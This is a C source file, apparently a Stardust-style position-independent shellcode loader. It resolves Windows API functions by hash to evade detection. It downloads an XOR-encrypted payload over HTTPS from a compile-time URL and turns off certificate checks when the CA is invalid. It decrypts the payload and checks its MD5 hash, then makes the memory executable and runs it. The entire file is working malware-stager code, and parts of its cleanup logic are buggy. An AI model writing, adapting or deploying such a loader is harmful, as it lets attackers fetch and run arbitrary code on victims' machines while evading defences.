#include <Common.h>
#include <Constexpr.h>

FUNC VOID Xor (
    _In_ PCHAR bin,
    _In_ int   len
) {
    STARDUST_INSTANCE

    int i;
    int keyLength = Instance()->Win32.strlen(MD5HASH);
    char key[] = MD5HASH;

    for( i = 0 ; i < len ; i++ )
    {
        bin[i]=bin[i]^key[i%keyLength];
    }

    return;
}

FUNC VOID Main(
    _In_ PVOID Param
) {
    STARDUST_INSTANCE

    //
    // resolve kernel32.dll related functions
    //
    if ( ( Instance()->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
        if ( ! ( Instance()->Win32.LoadLibraryW = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryW" ) ) ) ||
             ! ( Instance()->Win32.VirtualAlloc = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "VirtualAlloc" ) ) ) ||
             ! ( Instance()->Win32.VirtualProtect = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtect" ) ) ) ||
             ! ( Instance()->Win32.VirtualFree = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "VirtualFree" ) ) ) ||
             ! ( Instance()->Win32.GetLastError = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "GetLastError" ) ) )  ) {
            return;
        }
    }

    //
    // resolve user32.dll related functions
    //
    if ( ( Instance()->Modules.User32 = Instance()->Win32.LoadLibraryW( L"User32" ) ) ) {
        if ( ! ( Instance()->Win32.MessageBoxA = LdrFunction( Instance()->Modules.User32, HASH_STR( "MessageBoxA" ) ) ) ) {
            return;
        }
    }

    //
    // resolve Msvcrt.dll related functions
    //
    if ( ( Instance()->Modules.Msvcrt = Instance()->Win32.LoadLibraryW( L"Msvcrt" ) ) ) {
        if ( ! ( Instance()->Win32.strlen = LdrFunction( Instance()->Modules.Msvcrt, HASH_STR( "strlen" ) ) ) ||
             ! ( Instance()->Win32.strcmp = LdrFunction( Instance()->Modules.Msvcrt, HASH_STR( "strcmp" ) ) ) ||
             ! ( Instance()->Win32.calloc = LdrFunction( Instance()->Modules.Msvcrt, HASH_STR( "calloc" ) ) ) ||
             ! ( Instance()->Win32.memset = LdrFunction( Instance()->Modules.Msvcrt, HASH_STR( "memset" ) ) ) ||
             ! ( Instance()->Win32.free = LdrFunction( Instance()->Modules.Msvcrt, HASH_STR( "free" ) ) ) ||
             ! ( Instance()->Win32.sprintf = LdrFunction( Instance()->Modules.Msvcrt, HASH_STR( "sprintf" ) ) ) ) {
            return;
        }
    }

    //
    // resolve wininet.dll related functions
    //
    if ( ( Instance()->Modules.Wininet = Instance()->Win32.LoadLibraryW( L"wininet" ) ) ) {
        if ( ! ( Instance()->Win32.InternetOpenA = LdrFunction( Instance()->Modules.Wininet, HASH_STR( "InternetOpenA" ) ) )       ||
             ! ( Instance()->Win32.InternetConnectA = LdrFunction( Instance()->Modules.Wininet, HASH_STR( "InternetConnectA" ) ) ) ||
             ! ( Instance()->Win32.HttpOpenRequestA = LdrFunction( Instance()->Modules.Wininet, HASH_STR( "HttpOpenRequestA" ) ) ) ||
             ! ( Instance()->Win32.HttpSendRequestA = LdrFunction( Instance()->Modules.Wininet, HASH_STR( "HttpSendRequestA" ) ) ) ||
             ! ( Instance()->Win32.HttpQueryInfoA = LdrFunction( Instance()->Modules.Wininet, HASH_STR( "HttpQueryInfoA" ) ) )   ||
             ! ( Instance()->Win32.InternetQueryOption = LdrFunction( Instance()->Modules.Wininet, HASH_STR( "InternetQueryOptionA" ) ) ) ||
             ! ( Instance()->Win32.InternetSetOption = LdrFunction( Instance()->Modules.Wininet, HASH_STR( "InternetSetOptionA" ) ) ) ||
             ! ( Instance()->Win32.InternetCloseHandle = LdrFunction( Instance()->Modules.Wininet, HASH_STR( "InternetCloseHandle" ) ) ) ||
             ! ( Instance()->Win32.InternetReadFile = LdrFunction( Instance()->Modules.Wininet, HASH_STR( "InternetReadFile" ) ) )  ) {
            return;
        }
    }

    //
    // resolve advapi.dll related functions
    //
    if ( ( Instance()->Modules.Advapi32 = Instance()->Win32.LoadLibraryW( L"advapi32" ) ) ) {
        if ( ! ( Instance()->Win32.CryptAcquireContextA = LdrFunction( Instance()->Modules.Advapi32, HASH_STR( "CryptAcquireContextA" ) ) ) ||
             ! ( Instance()->Win32.CryptCreateHash = LdrFunction( Instance()->Modules.Advapi32, HASH_STR( "CryptCreateHash" ) ) )         ||
             ! ( Instance()->Win32.CryptHashData = LdrFunction( Instance()->Modules.Advapi32, HASH_STR( "CryptHashData" ) ) )             ||
             ! ( Instance()->Win32.CryptGetHashParam = LdrFunction( Instance()->Modules.Advapi32, HASH_STR( "CryptGetHashParam" ) ) )     ||
             ! ( Instance()->Win32.CryptDestroyHash = LdrFunction( Instance()->Modules.Advapi32, HASH_STR( "CryptDestroyHash" ) ) )       ||
             ! ( Instance()->Win32.CryptReleaseContext = LdrFunction( Instance()->Modules.Advapi32, HASH_STR( "CryptReleaseContext" ) ) )        ) {
            return;
        }
    }

    // Web
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    PCHAR useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36";
    PCSTR acceptTypes[] = { "*/*", NULL };
    DWORD dwBufLen = 0;
    DWORD dwSize = sizeof(DWORD);
    DWORD dwBytesRead = -1;
    BOOL bKeepReading = TRUE;
    PVOID pBuffer = NULL;
    DWORD dwFlags;
    DWORD dwFlagsLen = sizeof(dwFlags);
    
    // Crypto
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BOOL bAcquireSuccess = FALSE;
    BOOL bCreateSuccess = FALSE;
    BYTE bRawHash[MD5LEN];
    DWORD dwHashLen = MD5LEN;
    CHAR charset[] = "0123456789abcdef";
    PCHAR md5 = NULL;
    int iMatch = -1;

    // Initialize WinINet
    if ( ! ( hInternet = Instance()->Win32.InternetOpenA( useragent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0 ) ) )
        goto cleanup;        

    // Connect to site
    if ( ! ( hConnect = Instance()->Win32.InternetConnectA( hInternet, URL, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL ) ) )
        goto cleanup;

    // Create request
    if ( ! ( hRequest = Instance()->Win32.HttpOpenRequestA( hConnect, "GET", URI, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE, 0 ) ) )
        goto cleanup;

    // Send request
    if ( ! ( Instance()->Win32.HttpSendRequestA( hRequest, NULL, 0, NULL, NULL ) ) )
    {
        // If request fails due to invalid CA, set internet options to ignore unknown, invalid, or out of date certs
        if ( Instance()->Win32.GetLastError() == ERROR_INTERNET_INVALID_CA )
        {
            Instance()->Win32.InternetQueryOptionA( hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwFlagsLen );
            dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
            Instance()->Win32.InternetSetOptionA( hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof ( dwFlags ) );

            // Retry request
            if ( ! ( Instance()->Win32.HttpSendRequestA( hRequest, NULL, 0, NULL, NULL ) ) )
                goto cleanup;
        }
        else
            goto cleanup;               
    }

    // Retrieve length of response
    if ( ! ( Instance()->Win32.HttpQueryInfoA( hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER , &dwBufLen, &dwSize, NULL ) ) )
        goto cleanup;
 
    // Allocate buffer
    if ( ! ( pBuffer = Instance()->Win32.VirtualAlloc( NULL, dwBufLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) )
        goto cleanup;

    // Read payload
    while (bKeepReading && dwBytesRead != 0) {
        bKeepReading = Instance()->Win32.InternetReadFile( hRequest, pBuffer, dwBufLen, &dwBytesRead );
    }

    // XOR decrypt payload
    Xor( pBuffer, dwBufLen );

    // Check MD5 hash
    if ( bAcquireSuccess = Instance()->Win32.CryptAcquireContext( &hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT ) )
        if ( bCreateSuccess = Instance()->Win32.CryptCreateHash( hProv, CALG_MD5, 0, 0, &hHash ) )
            if ( Instance()->Win32.CryptHashData( hHash, pBuffer, dwBufLen, 0 ) )
                if ( Instance()->Win32.CryptGetHashParam( hHash, HP_HASHVAL, bRawHash, &dwHashLen, 0 ) )
                {
                    // Assemble final hash
                    md5 = Instance()->Win32.calloc(dwHashLen * 2, sizeof(char));
                    for (DWORD i = 0; i < dwHashLen; i++)
                        Instance()->Win32.sprintf(&md5[i * 2], "%c%c", charset[bRawHash[i] >> 4], charset[bRawHash[i] & 0xf]);
                }

cleanup:
    // Close internet handles
    if (hInternet)
        Instance()->Win32.InternetCloseHandle(hInternet);
    if (hConnect)
        Instance()->Win32.InternetCloseHandle(hInternet);
    if (hRequest)
        Instance()->Win32.InternetCloseHandle(hInternet);

    // Clean up crypto
    if (bAcquireSuccess)
        Instance()->Win32.CryptReleaseContext(hProv, 0);
    if (bCreateSuccess)
        Instance()->Win32.CryptDestroyHash(hHash);

    // If a hash was generated
    if (md5)
    {
        // Compare hardcoded MD5 sum against downloaded data
        iMatch = Instance()->Win32.strcmp(md5, MD5HASH);

        // Wipe + free buffer
        Instance()->Win32.memset(md5, 0, dwHashLen * 2);
        Instance()->Win32.free(md5);

        // If hashes match spawn shellcode
        if ( iMatch == 0)
        {
            DWORD dwOldProtect;
            Instance()->Win32.VirtualProtect(pBuffer, dwBufLen, PAGE_EXECUTE_READ, &dwOldProtect);
            (*(int(*)()) pBuffer)();
        }
        // Otherwise wipe buffer
        else
        {
            Instance()->Win32.memset(pBuffer, 0, dwBufLen);
            Instance()->Win32.VirtualFree(pBuffer, 9, MEM_RELEASE);
        }

        return;
    }
}